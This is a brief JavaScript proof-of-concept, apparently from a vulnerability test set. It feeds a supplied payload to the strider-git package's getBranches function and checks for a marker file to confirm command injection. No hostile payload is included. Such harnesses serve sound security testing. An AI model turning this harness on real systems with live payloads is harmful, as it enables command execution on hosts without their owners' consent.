function exploitFunction(payload) {
  const git = require("strider-git/lib");
  const fs = require("fs");
  const path = "./strider-git";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  git.getBranches(
    payload,
    "",
    function () {
      file_exist = fs.existsSync(path);
      if (file_exist) {
        fs.unlink(path, function (err) {
          if (err) {
            console.error("Error removing file:", err);
          } else {
            console.log("File removed:", path);
          }
          process.exit();
        });
      } else {
        console.error("File does not exist:", path);
        process.exit();
      }
    }
  );
}

module.exports = { exploitFunction };